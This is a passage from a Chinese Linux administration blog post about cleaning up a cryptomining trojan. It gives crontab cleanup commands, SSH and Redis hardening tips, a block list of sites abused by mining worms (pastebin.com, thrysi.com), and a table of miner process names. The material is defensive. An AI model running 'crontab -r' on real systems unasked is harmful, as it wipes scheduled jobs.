查看定时任务</span><br><span class="line">crontab -r 表示删除用户的定时任务，当执行此命令后，所有用户下面的定时任务会被删除</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191227100428997.png" alt="https://img-blog.csdnimg.cn/20191227100428997.png"></p><p>删除可以定时任务<code>crontab -e</code>,编辑删除定时任务即可。</p><ol start="5"><li>安全加固</li></ol><p>5.1. SSH<br>① 谨慎做免密登录<br>② 不使用默认的22端口<br>③ 禁止root登录</p><p>5.2. Redis<br>① 增加授权认证(requirepass参数)<br>② 尽量使用docker版本(docker pull redis)<br>③ 隐藏重要的命令</p><p>5.3 使用busybox删除</p><p>5.4 屏蔽<code>pastebin.com</code>、thrysi.com等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的</p><p>5.6 <code>netstat -natp</code> 命令查看是否有异常陌生IP的TCP连接，查询到有来自国外的陌生IP，做了白名单处理</p><p>5.7 启用ssh公钥登陆，禁用密码登陆。<br>5.8 云主机：完善安全策略，入口流量，一般只开放 80 443 端口就行，出口流量默认可以不限制，如果有需要根据需求来限制。物理机：可以通过硬件防火墙或者机器上iptables 来开放出入口流量规则。<br>5.9 本机不是直接需要对外提供服务，可以拒绝外网卡入口所有流量，通过 jumper 机器内网登陆业务机器。</p><h3 id="常见非法的木马病毒"><a href="#常见非法的木马病毒" class="headerlink" title="常见非法的木马病毒"></a>常见非法的木马病毒</h3><table><thead><tr><th>挖矿病毒</th><th>正常文件</th><th>关联文件</th><th>原因</th></tr></thead><tbody><tr><td>kdevtmpfsi</td><td>kdevtmpfs</td><td>kinsing</td><td>最根本的原因是自己的redis 6379配置不当导致的。大家可以参考阿里云的Redis服务安全加固</td></tr><tr><td>Watchdogs</td><td>Watchdog</td><td></td><td></td></tr><tr><td>trace</td><td>trace</td><td></td><td></td></tr></tbody></table></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">测小妹</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="https://seniortesting.club/posts/2S29MCV/">https://seniortesting.club/posts/2S29MCV/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://seniortesting.club" target="_blank">高级软件测试开发网</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/Python/">Python</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl15.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="ads-wrap"><ins class="adsbygoogle" style="display:block" data-ad-format="fluid" data-ad-layout-key="-6t+ed+2i-1n-4w" data-ad-client="ca-pub-1893384651266286" data-ad-slot="2627967536"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2BFAKJ4/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/cover1.jpeg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Mac机器或者虚拟机相关配置配置</div></div></a></div><div class="next-post pull-right"><a href="/posts/39GWX8G/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl22.jpeg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">最新genymotion3资源下载及其配置</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i> <span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7670b080/" title="java IO流"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-25</div><div class="title">java IO流</div></div></a></div><div><a href="/posts/2DF9TDW/" title="Windows10机器新环境配置"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">Windows10机器新环境配置</div></div></a></div><div><a href="/posts/1GD38XB/" title="Scrapy爬虫配置"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl24.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">Scrapy爬虫配置</div></div></a></div><div><a href="/posts/2SXCPP6/" title="Docker容器化技术"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl22.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">Docker容器化技术</div></div></a></div><div><a href="/posts/2DYGSQC/" title="JDK版本新特性"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/cover1.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">JDK版本新特性</div></div></a></div><div><a href="/posts/1PDQ4DG/" title="IntelliJ IDEA使用技巧和问题整理"><img class="cover" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl21.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">IntelliJ IDEA使用技巧和问题整理</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/avatar.png" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"><div class="author-info__name">测小妹</div><div class="author-info__description">专注前沿软件测试开发技术, 提升工作技能技巧</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">117</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/alterhu2020"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seniortesting/seniortesting.club" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:alterhu2020@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bin-bash-M-%E5%9D%8F%E7%9A%84%E8%A7%A3%E9%87%8A%E5%99%A8-%E6%B2%A1%E6%9C%89%E9%82%A3%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">&#x2F;bin&#x2F;bash^M 坏的解释器 没有那个文件或目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.1.</span> <span class="toc-text">解决方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash-sudo-command-not-found"><span class="toc-number">2.</span> <span class="toc-text">-bash: sudo: command not found</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nano%E5%91%BD%E4%BB%A4%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2search"><span class="toc-number">3.</span> <span class="toc-text">nano命令查找字符串search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sudo-apt-get-error-flAbsPath-on-var-lib-dpkg-status-failed-No-such-file-or-directory"><span class="toc-number">4.</span> <span class="toc-text">Sudo apt-get error: flAbsPath on &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;status failed - No such file or directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">5.</span> <span class="toc-text">复制本地文件到服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%87%BAtar-gz%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">列出tar.gz压缩包的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-number">7.</span> <span class="toc-text">Linux密钥登录和用户名密码登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%A7%E7%94%9F%E5%85%AC%E9%92%A5%E5%92%8C%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.</span> <span class="toc-text">1. 产生公钥和私钥文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%89%E8%A3%85%E5%85%AC%E9%92%A5"><span class="toc-number">7.2.</span> <span class="toc-text">2. 在服务器上安装公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%BE%E7%BD%AESSH%EF%BC%8C%E6%89%93%E5%BC%80%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">7.3.</span> <span class="toc-text">3. 设置SSH，打开公钥登录功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XShell%E7%AD%89%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%B0%86%E7%A7%81%E9%92%A5%E4%B8%8B%E8%BD%BD%E5%88%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">7.4.</span> <span class="toc-text">4. XShell等客户端将私钥下载到客户端，然后使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%B3%E9%97%AD%E5%8E%9F%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%E6%96%B9%E5%BC%8F-%E5%B0%8F%E5%BF%83%E6%B3%A8%E6%84%8F"><span class="toc-number">7.5.</span> <span class="toc-text">5. 关闭原密码登陆方式(小心注意)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E4%B8%ADCache%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="toc-number">8.</span> <span class="toc-text">Linux中Cache内存占用过高解决办法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%AF%A6%E7%BB%86%E8%B7%AF%E5%BE%84"><span class="toc-number">9.</span> <span class="toc-text">查看当前运行的进程的详细路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8Bpid%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">10.</span> <span class="toc-text">通过进程pid查看进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8%E6%8E%92%E5%BA%8F"><span class="toc-number">11.</span> <span class="toc-text">查看进程占用排序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-crontab%E5%91%BD%E4%BB%A4"><span class="toc-number">12.</span> <span class="toc-text">查看定时任务 crontab命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-crontab%E6%96%87%E4%BB%B6%E5%92%8Ccrontab-e%E5%91%BD%E4%BB%A4%E5%8C%BA%E5%88%AB"><span class="toc-number">12.1.</span> <span class="toc-text">&#x2F;etc&#x2F;crontab文件和crontab -e命令区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%97%B6%E5%8C%BA"><span class="toc-number">13.</span> <span class="toc-text">设置时区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%84%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F"><span class="toc-number">14.</span> <span class="toc-text">查看文件夹各个文件大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Blinux%E7%9A%84%E6%9E%B6%E6%9E%84-32-bit-or-64-bit"><span class="toc-number">15.</span> <span class="toc-text">查看linux的架构 32-bit or 64-bit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E6%89%93%E5%BC%80%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%8F%B7"><span class="toc-number">16.</span> <span class="toc-text">查看本机打开的端口号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E9%93%BE%E6%8E%A5"><span class="toc-number">17.</span> <span class="toc-text">创建链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E7%BC%93%E5%AD%98%E7%9A%84%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%8C%85"><span class="toc-number">18.</span> <span class="toc-text">删除缓存的安装失败的包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">19.</span> <span class="toc-text">修改用户名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5"><span class="toc-number">20.</span> <span class="toc-text">ssh登录失败</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%8F%98%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">21.</span> <span class="toc-text">改变当前用户组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip%E5%91%BD%E4%BB%A4%E4%B8%AD%E6%96%87%E6%96%87%E4%BB%B6%E5%90%8D%E4%B9%B1%E7%A0%81"><span class="toc-number">22.</span> <span class="toc-text">unzip命令中文文件名乱码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AElinux%E5%B9%B6%E5%8F%91%E6%9C%80%E5%A4%A7%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E6%95%B0"><span class="toc-number">23.</span> <span class="toc-text">配置linux并发最大打开文件数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BDmysql%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E4%BF%9D%E5%AD%987%E5%A4%A9%E8%AE%B0%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">24.</span> <span class="toc-text">定时备份mysql数据库，保存7天记录脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E6%88%96%E8%80%85telent%E7%99%BB%E5%BD%95linux%E5%90%8Escreen%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="toc-number">25.</span> <span class="toc-text">SSH 或者telent登录linux后screen后台运行脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E8%84%9A%E6%9C%AC%E4%B8%AD-gt-dev-null-2-gt-amp-1"><span class="toc-number">26.</span> <span class="toc-text">shell脚本中&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nohup%E7%BB%93%E5%90%88"><span class="toc-number">26.1.</span> <span class="toc-text">nohup结合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E6%B8%85%E7%90%86"><span class="toc-number">27.</span> <span class="toc-text">挖矿木马病毒清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E8%A7%A3%E6%9E%90"><span class="toc-number">27.1.</span> <span class="toc-text">木马解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-number">27.2.</span> <span class="toc-text">木马分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9D%9E%E6%B3%95%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92"><span class="toc-number">27.3.</span> <span class="toc-text">常见非法的木马病毒</span></a></li></ol></li></ol></div></div><div class="card-widget ads-wrap"><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1893384651266286" data-ad-slot="3377657013" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 测小妹</div><div class="footer_custom_text"><p><a style="margin-inline:5px" target="_blank" href="https://hexo.io/" rel="external nofollow noreferrer"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a><a style="margin-inline:5px" target="_blank" href="https://www.jsdelivr.com/" rel="external nofollow noreferrer"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a><a style="margin-inline:5px" target="_blank" href="https://github.com/" rel="external nofollow noreferrer"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a><a style="margin-inline:5px" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js").then(()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"})}))</script><script>(()=>{const t=document.getElementById("twikoo-count"),o=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"twikoo-comment-7gxq358sd1f410ac",region:"ap-shanghai"},null))},n=()=>{twikoo.getCommentsCount({envId:"twikoo-comment-7gxq358sd1f410ac",region:"ap-shanghai",urls:[window.location.pathname],includeReply:!1}).then((function(o){t.innerText=o[0].count})).catch((function(t){console.error(t)}))},e=(e=!1)=>{"object"==typeof twikoo?(o(),e&&t&&setTimeout(n,0)):getScript("https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js").then(()=>{o(),e&&t&&setTimeout(n,0)})};e(!0)})()</script></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/css/butterfly.css"><script data-pjax src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/js/butterfly.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>